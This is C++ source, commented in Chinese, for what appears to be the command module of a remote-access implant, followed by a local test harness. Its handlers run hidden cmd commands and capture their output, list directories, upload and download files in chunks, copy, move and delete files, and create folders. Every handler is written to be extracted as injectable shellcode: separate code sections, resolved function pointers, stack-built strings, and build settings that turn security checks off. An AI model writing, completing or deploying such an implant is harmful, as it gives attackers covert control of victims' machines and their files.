#include <iostream>
#include <windows.h>

#include "FuncType.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release x64
* 2.C/C++
* 常规: SDL检查(否)
* 优化: 优化(已禁用)
* 代码生成: 运行库(多线程)、安全检查(禁用安全检查)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

using namespace std;

#pragma code_seg(".cmd")

// 执行 CMD 命令
void ExecuteCmd(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(100);
    **pOutputData = '0';
    *pOutputDataLength = 1;

    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!((pCreatePipe)(pFuncAddr[9]))(&hRead, &hWrite, &sa, 0)) {
        return;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi;
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    if (!((pCreateProcessA)(pFuncAddr[8]))(NULL, commandPara, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        ((pCloseHandle)(pFuncAddr[7]))(hRead);
        ((pCloseHandle)(pFuncAddr[7]))(hWrite);
        return;
    }
    ((pCloseHandle)(pFuncAddr[7]))(hWrite);
    ((pCloseHandle)(pFuncAddr[7]))(pi.hThread);
    ((pCloseHandle)(pFuncAddr[7]))(pi.hProcess);

    *pOutputDataLength = 0;
    DWORD currentReadLength;
    while (((pReadFile)(pFuncAddr[10]))(hRead, *pOutputData + *pOutputDataLength, 100, &currentReadLength, NULL) && currentReadLength != 0) {
        *pOutputDataLength += currentReadLength;
        *pOutputData = (char*)((pRealloc)(pFuncAddr[1]))(*pOutputData, *pOutputDataLength + 100);
    }
    ((pCloseHandle)(pFuncAddr[7]))(hRead);
}

#pragma code_seg(".getFile")

// 获取文件信息列表
void GetFileInfoList(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(330);
    **pOutputData = '0';
    *(*pOutputData + 1) = '\0';
    *pOutputDataLength = 1;

    WIN32_FIND_DATAA findData;
    HANDLE hFind = ((pFindFirstFileA)pFuncAddr[11])(commandPara, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        if (!((pGetFullPathNameA)pFuncAddr[14])(commandPara, MAX_PATH, *pOutputData, NULL)) {
            ((pFindClose)pFuncAddr[13])(hFind);
            return;
        }
        do {
            if (*findData.cFileName != '.') {
                FILETIME localFileTime;
                if (!((pFileTimeToLocalFileTime)pFuncAddr[15])(&findData.ftLastWriteTime, &localFileTime)) {
                    ((pFindClose)pFuncAddr[13])(hFind);
                    break;
                }
                SYSTEMTIME systemTime;
                if (!((pFileTimeToSystemTime)pFuncAddr[16])(&localFileTime, &systemTime)) {
                    ((pFindClose)pFuncAddr[13])(hFind);
                    break;
                }
                volatile char format[] = { '\n', '%', 'd', ',', '%', 's', ',', '%', 'l', 'l', 'u', ',', '%', '0', '4', 'd', '.', '%', '0', '2', 'd', '.', '%', '0', '2', 'd', ' ', '%', '0', '2', 'd', ':', '%', '0', '2', 'd', ':', '%', '0', '2', 'd', '\0' };
                ((pSprintf_s)pFuncAddr[6])(*pOutputData + ((pStrlen)pFuncAddr[3])(*pOutputData), 330, (char*)format, (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0, findData.cFileName, ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow, systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
                *pOutputData = (char*)((pRealloc)pFuncAddr[1])(*pOutputData, ((pStrlen)pFuncAddr[3])(*pOutputData) + 330);
            }
        } while (((pFindNextFileA)pFuncAddr[12])(hFind, &findData));
    }
    *pOutputDataLength = ((pStrlen)pFuncAddr[3])(*pOutputData);
}

#pragma code_seg(".uplFile")

// 分块上传
void UploadFile(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(1);
    **pOutputData = '0';
    *pOutputDataLength = 1;

    FILE* file;
    volatile char modeWB[] = { 'w', 'b', '\0' };
    volatile char modeAB[] = { 'a', 'b', '\0' };
    if (*commandPara == '0') {
        if (((pFopen_s)pFuncAddr[18])(&file, commandPara + 1, (char*)modeWB)) {
            return;
        }
    }
    else {
        if (((pFopen_s)pFuncAddr[18])(&file, commandPara + 1, (char*)modeAB)) {
            return;
        }
    }

    int headLength = 1 + ((pStrlen)pFuncAddr[3])(commandPara + 1) + 1;
    if ((((pFwrite)pFuncAddr[21])(commandPara + headLength, 1, commandParaLength - headLength, file)) != commandParaLength - headLength) {
        ((pFclose)pFuncAddr[22])(file);
        return;
    }
    ((pFclose)pFuncAddr[22])(file);
    **pOutputData = '1';
}

#pragma code_seg(".dowFile")

// 分块下载
void DownloadFile(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    char* endPtr;
    long readLength = ((pStrtol)pFuncAddr[4])(commandPara, &endPtr, 10);
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(readLength);
    *pOutputDataLength = 0;

    FILE* file;
    volatile char modeRB[] = { 'r', 'b', '\0' };
    char* filePath = commandPara + ((pStrlen)pFuncAddr[3])(commandPara) + 1;
    if (((pFopen_s)pFuncAddr[18])(&file, filePath, (char*)modeRB)) {
        return;
    }
    unsigned long long int readIndex = ((pStrtoull)pFuncAddr[17])(filePath + ((pStrlen)pFuncAddr[3])(filePath) + 1, NULL, 10);
    ((p_Fseeki64)pFuncAddr[19])(file, readIndex, SEEK_SET);
    *pOutputDataLength = ((pFread)pFuncAddr[20])(*pOutputData, 1, readLength, file);
    ((pFclose)pFuncAddr[22])(file);
}

#pragma code_seg(".pasFile")

// 粘贴文件
void PasteFile(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(1);
    **pOutputData = '0';
    *pOutputDataLength = 1;

    char* newPath = commandPara + 1 + ((pStrlen)pFuncAddr[3])(commandPara + 1) + 1;
    if (*commandPara == '0') {
        if (!((pRename)(pFuncAddr[24]))(commandPara + 1, newPath)) {
            **pOutputData = '1';
        }
    }
    else {
        if (((pCopyFileA)(pFuncAddr[23]))(commandPara + 1, newPath, TRUE)) {
            **pOutputData = '1';
        }
    }
}

#pragma code_seg(".delFile")

// 删除文件
void DeleteFile_(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(1);
    **pOutputData = '0';
    *pOutputDataLength = 1;

    if (!((pRemove)(pFuncAddr[25]))(commandPara)) {
        **pOutputData = '1';
    }
}

#pragma code_seg(".cFolder")

// 新建文件夹
void CreateFolder(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(1);
    **pOutputData = '0';
    *pOutputDataLength = 1;

    if (((pCreateDirectoryA)(pFuncAddr[26]))(commandPara, NULL)) {
        **pOutputData = '1';
    }
}

#pragma code_seg(".text")

int main() {
    // 执行 CMD 命令
    char commandPara1[] = "cmd /c tasklist";
    int commandParaLength1 = strlen(commandPara1) + 1;

    // 获取文件信息列表
    char commandPara2[] = "C:\\Windows\\System32\\*";
    int commandParaLength2 = strlen(commandPara2) + 1;

    // 分块上传
    char commandPara3[] = "0D:\\1.txt\0""1234567";
    char commandPara4[] = "1D:\\1.txt\0""1234567";
    int commandParaLength34 = strlen(commandPara3) + 8;
    
    // 分块下载
    char commandPara5[] = "10240\0D:\\1.txt\0""0";
    int commandParaLength5 = strlen(commandPara5) + 1;

    // 剪切 / 复制
    char commandPara6[] = "0D:\\1.txt\0E:\\2.txt";
    char commandPara7[] = "1E:\\2.txt\0D:\\3.txt";
    int commandParaLength67 = strlen(commandPara6) + 10;
    
    // 删除文件
    char commandPara8[] = "E:\\2.txt";
    int commandParaLength8 = strlen(commandPara8) + 1;

    // 新建文件夹
    char commandPara9[] = "D:\\1";
    int commandParaLength9 = strlen(commandPara9) + 1;
    
    char* outputData;
    int outputDataLength;
    PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToLocalFileTime, FileTimeToSystemTime, strtoull, fopen_s, _fseeki64, fread, fwrite, fclose, CopyFileA, rename, ((int(*)(const char*))remove), CreateDirectoryA };
    
    ExecuteCmd(commandPara1, commandParaLength1, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;

    GetFileInfoList(commandPara2, commandParaLength2, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;

    UploadFile(commandPara3, commandParaLength34, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;
    UploadFile(commandPara4, commandParaLength34, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;

    DownloadFile(commandPara5, commandParaLength5, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;

    PasteFile(commandPara6, commandParaLength67, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;
    PasteFile(commandPara7, commandParaLength67, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;

    DeleteFile_(commandPara8, commandParaLength8, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;

    CreateFolder(commandPara9, commandParaLength9, &outputData, &outputDataLength, funcAddr);
    *(outputData + outputDataLength) = '\0';
    cout << outputData << endl;
}